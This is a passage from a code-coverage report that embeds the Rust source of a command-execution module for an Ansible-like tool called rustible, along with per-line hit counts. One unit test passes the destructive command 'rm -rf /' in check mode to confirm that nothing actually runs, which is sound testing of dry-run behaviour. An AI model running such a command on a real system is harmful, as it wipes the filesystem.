[25803290,25809981,25803206],"length":1,"stats":{"Line":1}},{"line":252,"address":[25803347],"length":1,"stats":{"Line":3}},{"line":253,"address":[25803385,25803472,25809960],"length":1,"stats":{"Line":2}},{"line":254,"address":[25803740,25803653,25809939],"length":1,"stats":{"Line":2}},{"line":255,"address":[25804008,25803921],"length":1,"stats":{"Line":2}},{"line":256,"address":[25804017],"length":1,"stats":{"Line":1}},{"line":257,"address":[25804112,25804196,25809918],"length":1,"stats":{"Line":1}},{"line":259,"address":[25804253],"length":1,"stats":{"Line":3}},{"line":260,"address":[25809897,25804291,25804378],"length":1,"stats":{"Line":2}},{"line":262,"address":[25804537],"length":1,"stats":{"Line":1}},{"line":265,"address":[25804736,25804671],"length":1,"stats":{"Line":2}},{"line":266,"address":[25804797],"length":1,"stats":{"Line":0}},{"line":273,"address":[25805097,25809854,25804779],"length":1,"stats":{"Line":2}},{"line":274,"address":[25805270],"length":1,"stats":{"Line":1}},{"line":277,"address":[25805348],"length":1,"stats":{"Line":1}},{"line":279,"address":[30287344],"length":1,"stats":{"Line":2}},{"line":280,"address":[30287358],"length":1,"stats":{"Line":0}},{"line":285,"address":[25805630],"length":1,"stats":{"Line":1}},{"line":286,"address":[25805693],"length":1,"stats":{"Line":1}},{"line":287,"address":[25805756],"length":1,"stats":{"Line":1}},{"line":288,"address":[25805811],"length":1,"stats":{"Line":1}},{"line":289,"address":[25805878],"length":1,"stats":{"Line":1}},{"line":293,"address":[25809827,25805369,25806277],"length":1,"stats":{"Line":2}},{"line":297,"address":[25806192],"length":1,"stats":{"Line":1}},{"line":298,"address":[25806521,25806574],"length":1,"stats":{"Line":2}},{"line":305,"address":[25806556],"length":1,"stats":{"Line":1}},{"line":306,"address":[25808982,25809294,25806749],"length":1,"stats":{"Line":2}},{"line":307,"address":[25808984,25809061,25809130,25809805],"length":1,"stats":{"Line":0}},{"line":309,"address":[25808956],"length":1,"stats":{"Line":1}},{"line":312,"address":[25809365,25809021],"length":1,"stats":{"Line":2}},{"line":314,"address":[25809771,25809488],"length":1,"stats":{"Line":1}},{"line":315,"address":[25809745,25809650],"length":1,"stats":{"Line":0}},{"line":318,"address":[25809680],"length":1,"stats":{"Line":1}},{"line":322,"address":[25806793,25807140,25806735],"length":1,"stats":{"Line":2}},{"line":323,"address":[25806803,25806904,25808954],"length":1,"stats":{"Line":0}},{"line":325,"address":[25806767],"length":1,"stats":{"Line":1}},{"line":329,"address":[25806826,25807266],"length":1,"stats":{"Line":2}},{"line":331,"address":[25807432],"length":1,"stats":{"Line":1}},{"line":333,"address":[25807590],"length":1,"stats":{"Line":1}},{"line":334,"address":[25807667,25808028,25807766],"length":1,"stats":{"Line":0}},{"line":337,"address":[25807748,25808575],"length":1,"stats":{"Line":1}},{"line":338,"address":[25808244,25808828,25808169,25808364],"length":1,"stats":{"Line":0}},{"line":341,"address":[25808041],"length":1,"stats":{"Line":1}},{"line":344,"address":[25801456,25801862,25801856],"length":1,"stats":{"Line":1}},{"line":349,"address":[25801792],"length":1,"stats":{"Line":1}},{"line":352,"address":[25801403,25800191,25796832],"length":1,"stats":{"Line":0}},{"line":353,"address":[25796901],"length":1,"stats":{"Line":0}},{"line":354,"address":[25797161,25797264],"length":1,"stats":{"Line":0}},{"line":355,"address":[25797345,25797429,25801401],"length":1,"stats":{"Line":0}},{"line":357,"address":[25797486],"length":1,"stats":{"Line":0}},{"line":358,"address":[25797524,25797615,25801380],"length":1,"stats":{"Line":0}},{"line":359,"address":[25797776,25801359],"length":1,"stats":{"Line":0}},{"line":360,"address":[25798201,25798117,25801282],"length":1,"stats":{"Line":0}},{"line":362,"address":[25798258],"length":1,"stats":{"Line":0}},{"line":363,"address":[25801241,25798296,25798383],"length":1,"stats":{"Line":0}},{"line":364,"address":[25801220,25798651,25798564],"length":1,"stats":{"Line":0}},{"line":366,"address":[25798923,25798832],"length":1,"stats":{"Line":0}},{"line":368,"address":[25799018,25799085,25801161],"length":1,"stats":{"Line":0}},{"line":369,"address":[25799258],"length":1,"stats":{"Line":0}},{"line":371,"address":[25799336],"length":1,"stats":{"Line":0}},{"line":373,"address":[25799383,25799499],"length":1,"stats":{"Line":0}},{"line":376,"address":[25799468],"length":1,"stats":{"Line":0}},{"line":377,"address":[25799588],"length":1,"stats":{"Line":0}},{"line":378,"address":[25799651],"length":1,"stats":{"Line":0}},{"line":379,"address":[25799706],"length":1,"stats":{"Line":0}},{"line":380,"address":[25799767],"length":1,"stats":{"Line":0}},{"line":383,"address":[25799491],"length":1,"stats":{"Line":0}},{"line":387,"address":[25801118,25800231,25799357],"length":1,"stats":{"Line":0}},{"line":391,"address":[25800807,25800493,25800131],"length":1,"stats":{"Line":0}},{"line":392,"address":[25801096,25800625,25800495,25800556],"length":1,"stats":{"Line":0}},{"line":394,"address":[25800457],"length":1,"stats":{"Line":0}}],"covered":104,"coverable":166},{"path":["/","home","artur","Repositories","rustible","src","modules","command.rs"],"content":"//! Command module - Execute arbitrary commands\n//!\n//! This module executes commands directly without going through a shell.\n//! For shell commands (pipes, redirects, etc.), use the shell module.\n//!\n//! Supports both local execution (using std::process::Command) and remote\n//! execution via async connections (SSH, Docker, etc.).\n\nuse super::{\n    Diff, Module, ModuleClassification, ModuleContext, ModuleError, ModuleOutput, ModuleParams,\n    ModuleResult, ParamExt,\n};\nuse crate::connection::{Connection, ExecuteOptions};\nuse std::path::Path;\nuse std::process::Command;\nuse std::sync::Arc;\n\n/// Module for executing commands directly\npub struct CommandModule;\n\nimpl CommandModule {\n    /// Build the command string from params (for display and remote execution)\n    fn get_command_string(\u0026self, params: \u0026ModuleParams) -\u003e ModuleResult\u003cString\u003e {\n        let cmd = params.get_string(\"cmd\")?;\n        let argv = params.get_vec_string(\"argv\")?;\n\n        if let Some(argv) = argv {\n            if argv.is_empty() {\n                return Err(ModuleError::InvalidParameter(\n                    \"argv cannot be empty\".to_string(),\n                ));\n            }\n            // Join argv with proper escaping for shell\n            Ok(argv\n                .iter()\n                .map(|arg| shell_escape(arg))\n                .collect::\u003cVec\u003c_\u003e\u003e()\n                .join(\" \"))\n        } else if let Some(cmd) = cmd {\n            if cmd.trim().is_empty() {\n                return Err(ModuleError::InvalidParameter(\n                    \"cmd cannot be empty\".to_string(),\n                ));\n            }\n            Ok(cmd)\n        } else {\n            Err(ModuleError::MissingParameter(\n                \"Either 'cmd' or 'argv' must be provided\".to_string(),\n            ))\n        }\n    }\n\n    /// Build a std::process::Command for local execution\n    fn build_command(\n        \u0026self,\n        params: \u0026ModuleParams,\n        context: \u0026ModuleContext,\n    ) -\u003e ModuleResult\u003cCommand\u003e {\n        let cmd = params.get_string(\"cmd\")?;\n        let argv = params.get_vec_string(\"argv\")?;\n\n        let mut command = if let Some(argv) = argv {\n            // If argv is provided, use the first element as the command\n            if argv.is_empty() {\n                return Err(ModuleError::InvalidParameter(\n                    \"argv cannot be empty\".to_string(),\n                ));\n            }\n            let mut cmd = Command::new(\u0026argv[0]);\n            if argv.len() \u003e 1 {\n                cmd.args(\u0026argv[1..]);\n            }\n            cmd\n        } else if let Some(cmd) = cmd {\n            // Parse the command string into arguments\n            let parts: Vec\u003c\u0026str\u003e = cmd.split_whitespace().collect();\n            if parts.is_empty() {\n                return Err(ModuleError::InvalidParameter(\n                    \"cmd cannot be empty\".to_string(),\n                ));\n            }\n            let mut cmd = Command::new(parts[0]);\n            if parts.len() \u003e 1 {\n                cmd.args(\u0026parts[1..]);\n            }\n            cmd\n        } else {\n            return Err(ModuleError::MissingParameter(\n                \"Either 'cmd' or 'argv' must be provided\".to_string(),\n            ));\n        };\n\n        // Set working directory\n        if let Some(chdir) = params.get_string(\"chdir\")? {\n            command.current_dir(\u0026chdir);\n        } else if let Some(ref work_dir) = context.work_dir {\n            command.current_dir(work_dir);\n        }\n\n        // Set environment variables\n        if let Some(serde_json::Value::Object(env)) = params.get(\"env\") {\n            for (key, value) in env {\n                if let serde_json::Value::String(v) = value {\n                    command.env(key, v);\n                }\n            }\n        }\n\n        Ok(command)\n    }\n\n    /// Build ExecuteOptions from params for remote execution\n    fn build_execute_options(\n        \u0026self,\n        params: \u0026ModuleParams,\n        context: \u0026ModuleContext,\n    ) -\u003e ModuleResult\u003cExecuteOptions\u003e {\n        let mut options = ExecuteOptions::new();\n\n        // Set working directory\n        if let Some(chdir) = params.get_string(\"chdir\")? {\n            options = options.with_cwd(chdir);\n        } else if let Some(ref work_dir) = context.work_dir {\n            options = options.with_cwd(work_dir.clone());\n        }\n\n        // Set environment variables\n        if let Some(serde_json::Value::Object(env)) = params.get(\"env\") {\n            for (key, value) in env {\n                if let serde_json::Value::String(v) = value {\n                    options = options.with_env(key, v);\n                }\n            }\n        }\n\n        // Set timeout\n        if let Some(timeout) = params.get_i64(\"timeout\")? {\n            if timeout \u003e 0 {\n                options = options.with_timeout(timeout as u64);\n            }\n        }\n\n        // Handle privilege escalation from context\n        if context.r#become {\n            options.escalate = true;\n            options.escalate_user = context.become_user.clone();\n            options.escalate_method = context.become_method.clone();\n        }\n\n        Ok(options)\n    }\n\n    /// Check creates/removes conditions locally\n    fn check_creates_removes_local(\n        \u0026self,\n        params: \u0026ModuleParams,\n    ) -\u003e ModuleResult\u003cOption\u003cModuleOutput\u003e\u003e {\n        // Check 'creates' - skip if file exists\n        if let Some(creates) = params.get_string(\"creates\")? {\n            if Path::new(\u0026creates).exists() {\n                return Ok(Some(ModuleOutput::ok(format!(\n                    \"Skipped, '{}' exists\",\n                    creates\n                ))));\n            }\n        }\n\n        // Check 'removes' - skip if file doesn't exist\n        if let Some(removes) = params.get_string(\"removes\")? {\n            if !Path::new(\u0026removes).exists() {\n                return Ok(Some(ModuleOutput::ok(format!(\n                    \"Skipped, '{}' does not exist\",\n                    removes\n                ))));\n            }\n        }\n\n        Ok(None)\n    }\n\n    /// Check creates/removes conditions on remote host\n    async fn check_creates_removes_remote(\n        \u0026self,\n        params: \u0026ModuleParams,\n        connection: \u0026Arc\u003cdyn Connection + Send + Sync\u003e,\n    ) -\u003e ModuleResult\u003cOption\u003cModuleOutput\u003e\u003e {\n        // Check 'creates' - skip if file exists\n        if let Some(creates) = params.get_string(\"creates\")? {\n            let exists = connection\n                .path_exists(Path::new(\u0026creates))\n                .await\n                .unwrap_or(false);\n            if exists {\n                return Ok(Some(ModuleOutput::ok(format!(\n                    \"Skipped, '{}' exists\",\n                    creates\n                ))));\n            }\n        }\n\n        // Check 'removes' - skip if file doesn't exist\n        if let Some(removes) = params.get_string(\"removes\")? {\n            let exists = connection\n                .path_exists(Path::new(\u0026removes))\n                .await\n                .unwrap_or(false);\n            if !exists {\n                return Ok(Some(ModuleOutput::ok(format!(\n                    \"Skipped, '{}' does not exist\",\n                    removes\n                ))));\n            }\n        }\n\n        Ok(None)\n    }\n\n    /// Execute command locally using std::process::Command\n    fn execute_local(\n        \u0026self,\n        params: \u0026ModuleParams,\n        context: \u0026ModuleContext,\n    ) -\u003e ModuleResult\u003cModuleOutput\u003e {\n        // Check creates/removes conditions\n        if let Some(output) = self.check_creates_removes_local(params)? {\n            return Ok(output);\n        }\n\n        // In check mode, return what would happen\n        if context.check_mode {\n            let cmd = self.get_command_string(params)?;\n            return Ok(ModuleOutput::changed(format!(\"Would execute: {}\", cmd)));\n        }\n\n        let mut command = self.build_command(params, context)?;\n        let cmd_display = self.get_command_string(params)?;\n\n        // Execute the command\n        let output = command.output().map_err(|e| {\n            ModuleError::ExecutionFailed(format!(\"Failed to execute '{}': {}\", cmd_display, e))\n        })?;\n\n        let stdout = String::from_utf8_lossy(\u0026output.stdout).to_string();\n        let stderr = String::from_utf8_lossy(\u0026output.stderr).to_string();\n        let rc = output.status.code().unwrap_or(-1);\n\n        // Check if command succeeded\n        let warn_on_stderr = params.get_bool_or(\"warn\", true);\n\n        if output.status.success() {\n            let mut result =\n                ModuleOutput::changed(format!(\"Command '{}' executed successfully\", cmd_display))\n                    .with_command_output(Some(stdout), Some(stderr.clone()), Some(rc));\n\n            if warn_on_stderr \u0026\u0026 !stderr.is_empty() {\n                result\n                    .data\n                    .insert(\"warnings\".to_string(), serde_json::json!([stderr]));\n            }\n\n            Ok(result)\n        } else {\n            Err(ModuleError::CommandFailed {\n                code: rc,\n                message: if stderr.is_empty() { stdout } else { stderr },\n            })\n        }\n    }\n\n    /// Execute command on remote host using async connection\n    fn execute_remote(\n        \u0026self,\n        params: \u0026ModuleParams,\n        context: \u0026ModuleContext,\n        connection: Arc\u003cdyn Connection + Send + Sync\u003e,\n    ) -\u003e ModuleResult\u003cModuleOutput\u003e {\n        // Use tokio runtime to execute async operations\n        let rt = tokio::runtime::Runtime::new().map_err(|e| {\n            ModuleError::ExecutionFailed(format!(\"Failed to create runtime: {}\", e))\n        })?;\n\n        let params_clone = params.clone();\n        let check_mode = context.check_mode;\n        let cmd_display = self.get_command_string(params)?;\n        let options = self.build_execute_options(params, context)?;\n        let warn_on_stderr = params.get_bool_or(\"warn\", true);\n\n        rt.block_on(async {\n            // Check creates/removes conditions on remote\n            if let Some(output) = self\n                .check_creates_removes_remote(\u0026params_clone, \u0026connection)\n                .await?\n            {\n                return Ok(output);\n            }\n\n            // In check mode, return what would happen\n            if check_mode {\n                return Ok(ModuleOutput::changed(format!(\n                    \"Would execute: {}\",\n                    cmd_display\n                )));\n            }\n\n            // Execute via connection\n            let result = connection\n                .execute(\u0026cmd_display, Some(options))\n                .await\n                .map_err(|e| {\n                    ModuleError::ExecutionFailed(format!(\n                        \"Failed to execute '{}': {}\",\n                        cmd_display, e\n                    ))\n                })?;\n\n            if result.success {\n                let mut output = ModuleOutput::changed(format!(\n                    \"Command '{}' executed successfully\",\n                    cmd_display\n                ))\n                .with_command_output(\n                    Some(result.stdout.clone()),\n                    Some(result.stderr.clone()),\n                    Some(result.exit_code),\n                );\n\n                if warn_on_stderr \u0026\u0026 !result.stderr.is_empty() {\n                    output\n                        .data\n                        .insert(\"warnings\".to_string(), serde_json::json!([result.stderr]));\n                }\n\n                Ok(output)\n            } else {\n                Err(ModuleError::CommandFailed {\n                    code: result.exit_code,\n                    message: if result.stderr.is_empty() {\n                        result.stdout\n                    } else {\n                        result.stderr\n                    },\n                })\n            }\n        })\n    }\n}\n\n/// Escape a string for use in shell commands\nfn shell_escape(s: \u0026str) -\u003e String {\n    // If the string contains no special characters, return as-is\n    if s.chars()\n        .all(|c| c.is_alphanumeric() || c == '_' || c == '-' || c == '.' || c == '/')\n    {\n        return s.to_string();\n    }\n    // Otherwise, wrap in single quotes and escape any single quotes within\n    format!(\"'{}'\", s.replace('\\'', \"'\\\\''\"))\n}\n\nimpl Module for CommandModule {\n    fn name(\u0026self) -\u003e \u0026'static str {\n        \"command\"\n    }\n\n    fn description(\u0026self) -\u003e \u0026'static str {\n        \"Execute commands without going through a shell\"\n    }\n\n    fn classification(\u0026self) -\u003e ModuleClassification {\n        ModuleClassification::RemoteCommand\n    }\n\n    fn required_params(\u0026self) -\u003e \u0026[\u0026'static str] {\n        \u0026[\"cmd\"]\n    }\n\n    fn validate_params(\u0026self, params: \u0026ModuleParams) -\u003e ModuleResult\u003c()\u003e {\n        // Must have either cmd or argv\n        if params.get(\"cmd\").is_none() \u0026\u0026 params.get(\"argv\").is_none() {\n            return Err(ModuleError::MissingParameter(\n                \"Either 'cmd' or 'argv' must be provided\".to_string(),\n            ));\n        }\n        Ok(())\n    }\n\n    fn execute(\n        \u0026self,\n        params: \u0026ModuleParams,\n        context: \u0026ModuleContext,\n    ) -\u003e ModuleResult\u003cModuleOutput\u003e {\n        // Dispatch to local or remote execution based on connection\n        if let Some(ref connection) = context.connection {\n            self.execute_remote(params, context, connection.clone())\n        } else {\n            self.execute_local(params, context)\n        }\n    }\n\n    fn check(\u0026self, params: \u0026ModuleParams, context: \u0026ModuleContext) -\u003e ModuleResult\u003cModuleOutput\u003e {\n        // For check mode, we run execute with check_mode=true in context\n        // The execute methods already handle check_mode internally\n        let check_context = ModuleContext {\n            check_mode: true,\n            ..context.clone()\n        };\n        self.execute(params, \u0026check_context)\n    }\n\n    fn diff(\u0026self, params: \u0026ModuleParams, _context: \u0026ModuleContext) -\u003e ModuleResult\u003cOption\u003cDiff\u003e\u003e {\n        let cmd = self.get_command_string(params)?;\n        Ok(Some(Diff::new(\"(none)\", format!(\"Execute: {}\", cmd))))\n    }\n}\n\n#[cfg(test)]\nmod tests {\n    use super::*;\n    use std::collections::HashMap;\n\n    #[test]\n    fn test_command_echo() {\n        let module = CommandModule;\n        let mut params: ModuleParams = HashMap::new();\n        params.insert(\"cmd\".to_string(), serde_json::json!(\"echo hello\"));\n\n        let context = ModuleContext::default();\n        let result = module.execute(\u0026params, \u0026context).unwrap();\n\n        assert!(result.changed);\n        assert!(result.stdout.as_ref().unwrap().contains(\"hello\"));\n        assert_eq!(result.rc, Some(0));\n    }\n\n    #[test]\n    fn test_command_with_argv() {\n        let module = CommandModule;\n        let mut params: ModuleParams = HashMap::new();\n        params.insert(\n            \"argv\".to_string(),\n            serde_json::json!([\"echo\", \"hello\", \"world\"]),\n        );\n\n        let context = ModuleContext::default();\n        let result = module.execute(\u0026params, \u0026context).unwrap();\n\n        assert!(result.changed);\n        assert!(result.stdout.as_ref().unwrap().contains(\"hello world\"));\n    }\n\n    #[test]\n    fn test_command_creates_exists() {\n        let module = CommandModule;\n        let mut params: ModuleParams = HashMap::new();\n        params.insert(\"cmd\".to_string(), serde_json::json!(\"echo hello\"));\n        params.insert(\"creates\".to_string(), serde_json::json!(\"/\"));\n\n        let context = ModuleContext::default();\n        let result = module.execute(\u0026params, \u0026context).unwrap();\n\n        assert!(!result.changed);\n        assert!(result.msg.contains(\"Skipped\"));\n    }\n\n    #[test]\n    fn test_command_check_mode() {\n        let module = CommandModule;\n        let mut params: ModuleParams = HashMap::new();\n        params.insert(\"cmd\".to_string(), serde_json::json!(\"rm -rf /\"));\n\n        let context = ModuleContext::default().with_check_mode(true);\n        let result = module.check(\u0026params, \u0026context).unwrap();\n\n        assert!(result.changed);\n        assert!(result.msg.contains(\"Would execute\"));\n    }\n\n    #[test]\n    fn test_command_fails() {\n        let module = CommandModule;\n        let mut params: ModuleParams = HashMap::new();\n        params.insert(\"cmd\".to_string(), serde_json::json!(\"false\"));\n\n        let context = ModuleContext::default();\n        let result = module.execute(\u0026params, \u0026context);\n\n        assert!(result.is_err());\n        if let Err(ModuleError::CommandFailed { code, .. }) = result {\n            assert_ne!(code, 0);\n        } else {\n            panic!(\"Expected CommandFailed error\");\n        }\n    }\n}\n","traces":[{"line":23,"address":[30236160,30238341,30237471],"length":1,"stats":{"Line":1}},{"line":24,"address":[30236212],"length":1,"stats":{"Line":1}},{"line":25,"address":[30236485,30236594,30238290],"length":1,"stats":{"Line":2}},{"line":27,"address":[30236807],"length":1,"stats":{"Line":1}},{"line":28,"address":[30236884,30237001],"length":1,"stats":{"Line":2}},{"line":29,"address":[30237485],"length":1,"stats":{"Line":0}},{"line":30,"address":[30237036],"length":1,"stats":{"Line":0}},{"line":34,"address":[30237153,30237276,30237007],"length":1,"stats":{"Line":3}},{"line":35,"address":[30237080],"length":1,"stats":{"Line":1}},{"line":36,"address":[28364627,28364592],"length":1,"stats":{"Line":3}},{"line":37,"address":[30237146],"length":1,"stats":{"Line":1}},{"line":38,"address":[30237236],"length":1,"stats":{"Line":1}},{"line":39,"address":[30237937,30236907,30238197,30237313,30237631,30237182,30237558],"length":1,"stats":{"Line":4}},{"line":40,"address":[30237679,30237784],"length":1,"stats":{"Line":2}},{"line":41,"address":[30237981],"length":1,"stats":{"Line":0}},{"line":42,"address":[30237942],"length":1,"stats":{"Line":0}},{"line":45,"address":[30237840],"length":1,"stats":{"Line":1}},{"line":47,"address":[30238084],"length":1,"stats":{"Line":0}},{"line":48,"address":[30237696],"length":1,"stats":{"Line":0}},{"line":54,"address":[30227312,30230670,30228584],"length":1,"stats":{"Line":1}},{"line":59,"address":[30227386],"length":1,"stats":{"Line":1}},{"line":60,"address":[30227662,30227771,30230616],"length":1,"stats":{"Line":2}},{"line":62,"address":[30227984],"length":1,"stats":{"Line":1}},{"line":64,"address":[30228184,30228061],"length":1,"stats":{"Line":2}},{"line":65,"address":[30228598],"length":1,"stats":{"Line":0}},{"line":66,"address":[30228228],"length":1,"stats":{"Line":0}},{"line":69,"address":[30228278,30228190],"length":1,"stats":{"Line":2}},{"line":70,"address":[30228285,30228358],"length":1,"stats":{"Line":2}},{"line":71,"address":[30228416],"length":1,"stats":{"Line":1}},{"line":73,"address":[30228392],"length":1,"stats":{"Line":1}},{"line":74,"address":[30228309,30228685,30228758,30228087,30228394],"length":1,"stats":{"Line":3}},{"line":76,"address":[30228919,30228806],"length":1,"stats":{"Line":2}},{"line":77,"address":[30229020,30228949],"length":1,"stats":{"Line":2}},{"line":78,"address":[30230312],"length":1,"stats":{"Line":0}},{"line":79,"address":[30229061],"length":1,"stats":{"Line":0}},{"line":82,"address":[30229100,30229026],"length":1,"stats":{"Line":2}},{"line":83,"address":[30229122,30229195],"length":1,"stats":{"Line":2}},{"line":84,"address":[30229250],"length":1,"stats":{"Line":1}},{"line":86,"address":[30229229],"length":1,"stats":{"Line":1}},{"line":88,"address":[30230448],"length":1,"stats":{"Line":0}},{"line":89,"address":[30228823],"length":1,"stats":{"Line":0}},{"line":94,"address":[30229396,30228554],"length":1,"stats":{"Line":2}},{"line":95,"address":[30229638],"length":1,"stats":{"Line":0}},{"line":96,"address":[30229653,30229794],"length":1,"stats":{"Line":1}},{"line":97,"address":[30229810],"length":1,"stats":{"Line":0}},{"line":101,"address":[30229824,30229986,30229758],"length":1,"stats":{"Line":2}},{"line":102,"address":[30230014],"length":1,"stats":{"Line":0}},{"line":103,"address":[30230175],"length":1,"stats":{"Line":0}},{"line":104,"address":[30230218],"length":1,"stats":{"Line":0}},{"line":109,"address":[30229880],"length":1,"stats":{"Line":1}},{"line":113,"address":[30238384,30239269,30240729],"length":1,"stats":{"Line":0}},{"line":118,"address":[30238435],"length":1,"stats":{"Line":0}},{"line":121,"address":[30240603,30238590,30238506],"length":1,"stats":{"Line":0}},{"line":122,"address":[30238936,30238813],"length":1,"stats":{"Line":0}},{"line":123,"address":[30238902,30239024,30239246],"length":1,"stats":{"Line":0}},{"line":124,"address":[30239032,30239259,30239115],"length":1,"stats":{"Line":0}},{"line":128,"address":[30238988,30239280,30239371],"length":1,"stats":{"Line":0}},{"line":129,"address":[30239399],"length":1,"stats":{"Line":0}},{"line":130,"address":[30239728,30239560],"length":1,"stats":{"Line":0}},{"line":131,"address":[30239595],"length":1,"stats":{"Line":0}},{"line":137,"address":[30239341,30240565,30239749],"length":1,"stats":{"Line":0}},{"line":138,"address":[30239922,30240079],"length":1,"stats":{"Line":0}},{"line":139,"address":[30239951],"length":1,"stats":{"Line":0}},{"line":144,"address":[30240547,30239933],"length":1,"stats":{"Line":0}},{"line":145,"address":[30240188],"length":1,"stats":{"Line":0}},{"line":146,"address":[30240196,30240238],"length":1,"stats":{"Line":0}},{"line":147,"address":[30240366,30240408],"length":1,"stats":{"Line":0}},{"line":150,"address":[30240084],"length":1,"stats":{"Line":0}},{"line":154,"address":[30241532,30241538,30240768],"length":1,"stats":{"Line":1}},{"line":159,"address":[30240814],"length":1,"stats":{"Line":1}},{"line":160,"address":[30241075,30241258],"length":1,"stats":{"Line":2}},{"line":161,"address":[30241306],"length":1,"stats":{"Line":1}},{"line":169,"address":[30241556,30241112],"length":1,"stats":{"Line":1}},{"line":170,"address":[30241888,30241759],"length":1,"stats":{"Line":0}},{"line":171,"address":[30241917,30241963],"length":1,"stats":{"Line":0}},{"line":178,"address":[30241793],"length":1,"stats":{"Line":1}},{"line":182,"address":[30242160],"length":1,"stats":{"Line":0}},{"line":188,"address":[28364926,28365539,28364776],"length":1,"stats":{"Line":0}},{"line":189,"address":[28365781,28365197,28365855,28365504,28365417],"length":1,"stats":{"Line":0}},{"line":190,"address":[28365354,28365421],"length":1,"stats":{"Line":0}},{"line":191,"address":[28364837,28365457,28365629,28365813,28365520],"length":1,"stats":{"Line":0}},{"line":193,"address":[28365867],"length":1,"stats":{"Line":0}},{"line":194,"address":[28366530,28365905],"length":1,"stats":{"Line":0}},{"line":202,"address":[28366525,28365947,28365232],"length":1,"stats":{"Line":0}},{"line":203,"address":[28366980,28366912,28366218,28366427,28366490],"length":1,"stats":{"Line":0}},{"line":204,"address":[28366431,28366376],"length":1,"stats":{"Line":0}},{"line":205,"address":[26025473],"length":1,"stats":{"Line":0}},{"line":207,"address":[28366992],"length":1,"stats":{"Line":0}},{"line":208,"address":[28367004,28367061],"length":1,"stats":{"Line":0}},{"line":215,"address":[28366245],"length":1,"stats":{"Line":0}},{"line":219,"address":[30233998,30234264,30230704],"length":1,"stats":{"Line":1}},{"line":225,"address":[30230766],"length":1,"stats":{"Line":1}},{"line":226,"address":[30231071],"length":1,"stats":{"Line":1}},{"line":230,"address":[30231096],"length":1,"stats":{"Line":1}},{"line":231,"address":[30234285,30231224],"length":1,"stats":{"Line":1}},{"line":232,"address":[30234446,30234517],"length":1,"stats":{"Line":2}},{"line":235,"address":[30231138,30231312],"length":1,"stats":{"Line":1}},{"line":236,"address":[30231489,30231556,30234262],"length":1,"stats":{"Line":2}},{"line":239,"address":[30231931,30231729,30231824],"length":1,"stats":{"Line":2}},{"line":240,"address":[28359903,28359822],"length":1,"stats":{"Line":0}},{"line":243,"address":[30232084,30232163],"length":1,"stats":{"Line":2}},{"line":244,"address":[30232318],"length":1,"stats":{"Line":1}},{"line":245,"address":[30232518],"length":1,"stats":{"Line":1}},{"line":248,"address":[30232585],"length":1,"stats":{"Line":1}},{"line":250,"address":[30232626,30233436],"length":1,"stats":{"Line":2}},{"line":251,"address":[30233299,30232682,30232983],"length":1,"stats":{"Line":3}},{"line":253,"address":[30233221,30233353,30233114,30234150],"length":1,"stats":{"Line":2}},{"line":255,"address":[30233504,30233380,30233449],"length":1,"stats":{"Line":3}},{"line":256,"address":[30233925,30233510],"length":1,"stats":{"Line":0}},{"line":258,"address":[30233584,30233933,30233523,30234004],"length":1,"stats":{"Line":0}},{"line":261,"address":[30233384],"length":1,"stats":{"Line":1}},{"line":263,"address":[30232848],"length":1,"stats":{"Line":1}},{"line":265,"address":[30232663,30232716],"length":1,"stats":{"Line":2}},{"line":271,"address":[30236147,30236063,30234688],"length":1,"stats":{"Line":0}},{"line":278,"address":[30234834,30234754,30234929,30236145],"length":1,"stats":{"Line":0}},{"line":279,"address":[28360223,28360155],"length":1,"stats":{"Line":0}},{"line":282,"address":[30235121],"length":1,"stats":{"Line":0}},{"line":283,"address":[30235184],"length":1,"stats":{"Line":0}},{"line":284,"address":[30235205,30235269,30236115],"length":1,"stats":{"Line":0}},{"line":285,"address":[30235462,30235529],"length":1,"stats":{"Line":0}},{"line":286,"address":[30235709,30235787],"length":1,"stats":{"Line":0}},{"line":288,"address":[28360447,28361885,28360781,28360626,28360400,28364205,28360586],"length":1,"stats":{"Line":0}},{"line":290,"address":[28361118,28360726,28361880,28360496,28361002,28361042],"length":1,"stats":{"Line":0}},{"line":291,"address":[28360557],"length":1,"stats":{"Line":0}},{"line":292,"address":[28360616,28360759,28360711,28361086,28360815,28361012],"length":1,"stats":{"Line":0}},{"line":294,"address":[28361240],"length":1,"stats":{"Line":0}},{"line":298,"address":[28361276],"length":1,"stats":{"Line":0}},{"line":299,"address":[28361726,28361362],"length":1,"stats":{"Line":0}},{"line":306,"address":[28362195,28361324,28361619,28361682,28362271,28362063],"length":1,"stats":{"Line":0}},{"line":307,"address":[28361623,28361476],"length":1,"stats":{"Line":0}},{"line":308,"address":[28360634,28361647,28361704,28361899,28362127],"length":1,"stats":{"Line":0}},{"line":309,"address":[28362149,28364563,28364272],"length":1,"stats":{"Line":0}},{"line":310,"address":[28364302,28364387],"length":1,"stats":{"Line":0}},{"line":316,"address":[28363320,28362372],"length":1,"stats":{"Line":0}},{"line":317,"address":[28363171,28362816,28362420],"length":1,"stats":{"Line":0}},{"line":321,"address":[28363225],"length":1,"stats":{"Line":0}},{"line":322,"address":[28362947,28363023],"length":1,"stats":{"Line":0}},{"line":323,"address":[28363063,28363131],"length":1,"stats":{"Line":0}},{"line":324,"address":[28363163],"length":1,"stats":{"Line":0}},{"line":327,"address":[28363388,28363256,28363325],"length":1,"stats":{"Line":0}},{"line":328,"address":[28363394,28363834],"length":1,"stats":{"Line":0}},{"line":330,"address":[28363500,28363842,28363407,28363438],"length":1,"stats":{"Line":0}},{"line":333,"address":[28363268],"length":1,"stats":{"Line":0}},{"line":335,"address":[28362625],"length":1,"stats":{"Line":0}},{"line":336,"address":[28362382],"length":1,"stats":{"Line":0}},{"line":337,"address":[28362393,28362563,28362501],"length":1,"stats":{"Line":0}},{"line":338,"address":[28362565],"length":1,"stats":{"Line":0}},{"line":340,"address":[28362507],"length":1,"stats":{"Line":0}},{"line":349,"address":[30226944,30227291,30227297],"length":1,"stats":{"Line":1}},{"line":351,"address":[30227003,30227028],"length":1,"stats":{"Line":2}},{"line":352,"address":[28359708,28359680],"length":1,"stats":{"Line":3}},{"line":354,"address":[30227129],"length":1,"stats":{"Line":1}},{"line":357,"address":[30227042,30227140],"length":1,"stats":{"Line":0}},{"line":361,"address":[30226320],"length":1,"stats":{"Line":0}},{"line":365,"address":[30225440],"length":1,"stats":{"Line":0}},{"line":369,"address":[30225472],"length":1,"stats":{"Line":0}},{"line":373,"address":[30225488],"length":1,"stats":{"Line":0}},{"line":377,"address":[30225520],"length":1,"stats":{"Line":0}},{"line":379,"address":[30225557,30225623],"length":1,"stats":{"Line":0}},{"line":380,"address":[30225691],"length":1,"stats":{"Line":0}},{"line":381,"address":[30225663],"length":1,"stats":{"Line":0}},{"line":384,"address":[30225600],"length":1,"stats":{"Line":0